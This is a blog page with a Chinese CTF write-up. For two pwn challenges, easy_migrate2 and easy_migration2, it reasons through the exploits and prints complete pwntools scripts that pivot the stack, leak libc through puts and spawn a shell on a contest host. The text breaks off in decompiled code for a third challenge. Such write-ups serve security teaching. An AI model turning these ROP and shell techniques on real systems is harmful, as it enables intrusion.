@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第一次内部赛easy_migrate2checksec一下，开启了nx: 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x3fd000) ida查看一下,发现在vuln函数中有栈溢出，但是只能溢出一点点：   而">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gzhu_lalala">
+<meta property="og:url" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="第一次内部赛easy_migrate2checksec一下，开启了nx: 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x3fd000) ida查看一下,发现在vuln函数中有栈溢出，但是只能溢出一点点：   而">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e1_1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e1_2.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e1_3.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e2_1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e2_2.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e3_4.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e3_5.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e3_1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e3_2.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/nc.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/ret2text_3.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/ret2text_2.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/ret2text_1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/ret2text_flag.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/ret2libc_1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/ret2libc_33.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/ret2libc_flag.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/ret2libc_exp.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/rich_ch.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/rich_1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/rich_2.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/rich_3.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/rich_exp.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/rich_flag.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/srop_exp.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/srop_yu.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/head_1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/head_flag.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/%E5%8E%8B%E7%BC%A9.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/%E9%9F%B3%E9%A2%91%E5%8F%97%E6%8D%9F_flag.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/enc1-1.png">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/welcomemisc_flag-1.jpg">
+<meta property="og:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/null.jpg">
+<meta property="article:published_time" content="2023-10-29T12:38:46.000Z">
+<meta property="article:modified_time" content="2024-03-24T04:48:45.153Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gl-zhou.github.io/2023/10/29/gzhu-lalala/e1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>gzhu_lalala</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/29/hello-world/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&text=gzhu_lalala"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&is_video=false&description=gzhu_lalala"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=gzhu_lalala&body=Check out this article: https://gl-zhou.github.io/2023/10/29/gzhu-lalala/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&name=gzhu_lalala&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&t=gzhu_lalala"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">第一次内部赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-migrate2"><span class="toc-number">1.1.</span> <span class="toc-text">easy_migrate2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-migration2"><span class="toc-number">1.2.</span> <span class="toc-text">easy_migration2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hard-eval"><span class="toc-number">1.3.</span> <span class="toc-text">hard_eval</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E6%96%B0%E7%94%9F%E8%B5%9B"><span class="toc-number">2.</span> <span class="toc-text">2023新生赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">2.1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nc"><span class="toc-number">2.1.1.</span> <span class="toc-text">nc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">2.1.2.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">2.1.3.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%A7%E7%83%A4"><span class="toc-number">2.1.4.</span> <span class="toc-text">烧烤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#srop"><span class="toc-number">2.1.5.</span> <span class="toc-text">srop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-fm"><span class="toc-number">2.1.6.</span> <span class="toc-text">ez_fm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%A4%B4"><span class="toc-number">2.2.1.</span> <span class="toc-text">大头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%8E%8B%E7%BC%A9"><span class="toc-number">2.2.2.</span> <span class="toc-text">一个压缩</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9F%B3%E9%A2%91%E5%8F%97%E6%8D%9F"><span class="toc-number">2.2.3.</span> <span class="toc-text">音频受损</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F%E4%B9%B1%E4%BA%86"><span class="toc-number">2.2.4.</span> <span class="toc-text">顺序乱了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome"><span class="toc-number">2.2.5.</span> <span class="toc-text">welcome</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024"><span class="toc-number">3.</span> <span class="toc-text">2024</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.1.</span> <span class="toc-text">null</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        gzhu_lalala
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-29T12:38:46.000Z" class="dt-published" itemprop="datePublished">2023-10-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="第一次内部赛"><a href="#第一次内部赛" class="headerlink" title="第一次内部赛"></a>第一次内部赛</h1><h2 id="easy-migrate2"><a href="#easy-migrate2" class="headerlink" title="easy_migrate2"></a>easy_migrate2</h2><p>checksec一下，开启了nx:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure>
+<p>ida查看一下,发现在vuln函数中有栈溢出，但是只能溢出一点点：</p>
+<img src="/2023/10/29/gzhu-lalala/e1.jpg" class title="图片描述">
+
+<p>而且溢出点要a1&#x3D;305419896时才会执行，a1就是main函数第二次输入的buf</p>
+<img src="/2023/10/29/gzhu-lalala/e1_1.jpg" class title="图片描述">
+
+<p>跟进发现sskd在bss段上，且该段可写，于是想到在该处写入，构造system(‘&#x2F;bin&#x2F;sh’),但是一次只能键入0x20，于是要分两次写入。</p>
+<img src="/2023/10/29/gzhu-lalala/e1_2.jpg" class title="图片描述">
+
+<img src="/2023/10/29/gzhu-lalala/e1_3.jpg" class title="图片描述">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=flat([pop_rdi_ret,puts_got,puts_plt,main_addr])</span><br></pre></td></tr></table></figure>
+<p>先泄露puts函数地址,计算偏移。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=flat([b&quot;A&quot; * 0x30, sskd- 8, leave_ret])</span><br></pre></td></tr></table></figure>
+<p>将栈劫持到sskd上，之所以减八，是因为两次leave ret刚好使得栈指针指向sskd，执行payload1的泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload3 = flat([pop_rdi_ret, libc.address + 0x01b45bd,libc.address+0x052290])</span><br></pre></td></tr></table></figure>
+<p>构造system(‘&#x2F;bin&#x2F;sh’)。</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">import time</span><br><span class="line">#io=process(&#x27;./easy_migrate2&#x27;)</span><br><span class="line">io=remote(&#x27;172.22.107.127&#x27;,49730)</span><br><span class="line">elf=ELF(&#x27;./easy_migrate2&#x27;)</span><br><span class="line">libc=ELF(&#x27;libc6_2.31-0ubuntu9.12_amd64.so&#x27; )</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">a1=0x12345678</span><br><span class="line">sskd=0x4050a0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leave_ret=0x000000000040124b</span><br><span class="line">pop_rdi_ret=0x0000000000401353</span><br><span class="line">pop_rsi_r15_ret=0x0000000000401351</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[&#x27;main&#x27;]</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">#bss </span><br><span class="line">p1=flat([pop_rdi_ret,puts_got,puts_plt,main_addr])</span><br><span class="line">io.recv()</span><br><span class="line">io.send(p1)</span><br><span class="line">io.sendafter(b&quot;number&quot;, p32(0x12345678))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&quot;A&quot; * 0x30, sskd- 8, leave_ret])</span><br><span class="line">io.sendafter(b&quot;TaiCooLa&quot;, payload2)</span><br><span class="line"></span><br><span class="line">libc.address = u64(io.recvline()[:-1].ljust(8,b&quot;\x00&quot;))-0x084420</span><br><span class="line"></span><br><span class="line">success(&quot;libc_base--&gt;%s &quot;,hex(libc.address))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload3 = flat([pop_rdi_ret, libc.address + 0x01b45bd,libc.address+0x052290])</span><br><span class="line">io.sendlineafter(b&quot;again!\n&quot;, payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="easy-migration2"><a href="#easy-migration2" class="headerlink" title="easy_migration2"></a>easy_migration2</h2><p>checksec:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>ida打开发现有栈溢出但不多，有溢出点：</p>
+<img src="/2023/10/29/gzhu-lalala/e2_1.jpg" class title="图片描述">
+
+<p>而bss段可写，直接在old rbp 处修改地址，在bss段布置get shell的payload。</p>
+<img src="/2023/10/29/gzhu-lalala/e2_2.jpg" class title="图片描述">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x50+p64(bss+0x50)+p64(0x4011ff)</span><br></pre></td></tr></table></figure>
+
+<p>触发栈溢出。</p>
+<p>payload2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell=p64(pop_rdi)+p64(puts_got)+p64(puts) #泄露了puts函数地址</span><br><span class="line">shell+=p64(pop_rbp)+p64(bss+0x800)+p64(0x4011ff)  </span><br><span class="line">shell=shell.ljust(0x50,b&quot;\x00&quot;)</span><br><span class="line">shell+=p64(bss-8)+p64(leave)</span><br></pre></td></tr></table></figure>
+
+
+<p>然后get shell.<br>payload3:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell=p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">shell=shell.ljust(0x50,b&quot;\x00&quot;)</span><br><span class="line">shell+=p64(bss+0x800-0x58)+p64(leave)</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from pwnlib import *</span><br><span class="line">from ctypes import *</span><br><span class="line">sh=remote( &#x27;172.22.107.127&#x27; ,49745)</span><br><span class="line">#sh=process(&quot;./easy_migration2&quot;)</span><br><span class="line">elf=ELF(&quot;./easy_migration2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">un=lambda a:sh.recvuntil(a)</span><br><span class="line">rv=lambda a:sh.recv(a)</span><br><span class="line">rl=lambda:sh.recvline()</span><br><span class="line">sd=lambda a:sh.send(a)</span><br><span class="line">sl=lambda a:sh.sendline(a)</span><br><span class="line">Jz=lambda a:u64(sh.recv(6)+b&quot;\x00&quot;*2)-a</span><br><span class="line">inter=lambda :sh.interactive()</span><br><span class="line">U64=lambda a:u64(sh.recv(6)+b&quot;\x00&quot;*2)-libc.sym[a]</span><br><span class="line"></span><br><span class="line">libcc=cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=0x4012B3</span><br><span class="line">ret=0x40124B</span><br><span class="line">puts=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">leave=0x401227 #4011FF</span><br><span class="line">bss=0x404100</span><br><span class="line">un(&quot;me:&quot;)</span><br><span class="line">pop_rbp=0x000000000040115d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sd(b&quot;a&quot;*0x50+p64(bss+0x50)+p64(0x4011ff))</span><br><span class="line"></span><br><span class="line">un(&quot;funny\n&quot;)</span><br><span class="line">shell=p64(pop_rdi)+p64(puts_got)+p64(puts)</span><br><span class="line">shell+=p64(pop_rbp)+p64(bss+0x800)+p64(0x4011ff)</span><br><span class="line">shell=shell.ljust(0x50,b&quot;\x00&quot;)</span><br><span class="line">shell+=p64(bss-8)+p64(leave)</span><br><span class="line"></span><br><span class="line">sd(shell)</span><br><span class="line">un(&quot;funny\n&quot;)</span><br><span class="line"></span><br><span class="line">jz=u64(sh.recv(6)+b&quot;\x00&quot;*2)-	0x084420</span><br><span class="line">print (hex(jz))</span><br><span class="line">system=jz+	0x052290</span><br><span class="line">bin_sh=jz+	0x1b45bd</span><br><span class="line"></span><br><span class="line">shell=p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">shell=shell.ljust(0x50,b&quot;\x00&quot;)</span><br><span class="line">shell+=p64(bss+0x800-0x58)+p64(leave)</span><br><span class="line">sd(shell)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
+
+<h2 id="hard-eval"><a href="#hard-eval" class="headerlink" title="hard_eval"></a>hard_eval</h2><p>checksec，保护全开:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>ida:<br>发现好复杂，看了好久：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[160]; // [rsp+10h] [rbp-1B0h] BYREF</span><br><span class="line">  char v5[264]; // [rsp+B0h] [rbp-110h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+1B8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  while ( sub_9D6(v5, 0x100uLL) )               // return v6</span><br><span class="line">    sub_E50((__int64)v5, v4);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br><span class="line">// v5,256</span><br><span class="line">__int64 __fastcall sub_9D6(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  char buf; // [rsp+1Fh] [rbp-11h] BYREF</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  memset(a1, 0, a2);                            // v5=264</span><br><span class="line">                                                // 256*b&#x27;0&#x27;+8个字符</span><br><span class="line">  while ( a2 &gt; v6 + 1 &amp;&amp; read(0, &amp;buf, 1uLL) != -1 &amp;&amp; buf != 10 )// 256&gt;v6+1 and 文件没到末尾 and buf不等于10</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !(unsigned int)sym((unsigned int)buf) &amp;&amp; 